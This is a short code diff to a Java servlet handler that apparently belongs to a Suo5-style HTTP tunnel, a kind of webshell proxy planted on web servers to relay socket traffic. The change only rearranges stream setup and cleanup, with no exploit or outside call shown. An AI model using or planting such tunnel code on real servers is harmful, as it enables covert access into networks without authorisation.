@@ -326,10 +326,10 @@ public class Suo5v2UndertowServletHandler implements Runnable, HostnameVerifier,
 
         Thread t = null;
         boolean sendClose = true;
-        final OutputStream scOutStream = socket.getOutputStream();
-        final InputStream scInStream = socket.getInputStream();
-        final OutputStream respOutputStream = (OutputStream) resp.getClass().getMethod("getOutputStream").invoke(resp);
         try {
+            final OutputStream scOutStream = socket.getOutputStream();
+            final InputStream scInStream = socket.getInputStream();
+            final OutputStream respOutputStream = (OutputStream) resp.getClass().getMethod("getOutputStream").invoke(resp);
 
             Suo5v2UndertowServletHandler p = new Suo5v2UndertowServletHandler(scInStream, respOutputStream, tunId);
             t = new Thread(p);
@@ -361,16 +361,14 @@ public class Suo5v2UndertowServletHandler implements Runnable, HostnameVerifier,
             }
         } catch (Exception ignored) {
         } finally {
+
             try {
                 socket.close();
             } catch (Exception ignored) {
             }
+
             if (sendClose) {
                 writeAndFlush(resp, marshalBase64(newDel(tunId)), 0);
-            }
-            try {
-                respOutputStream.close();
-            } catch (Exception ignored) {
             }
             if (t != null) {
                 t.join();
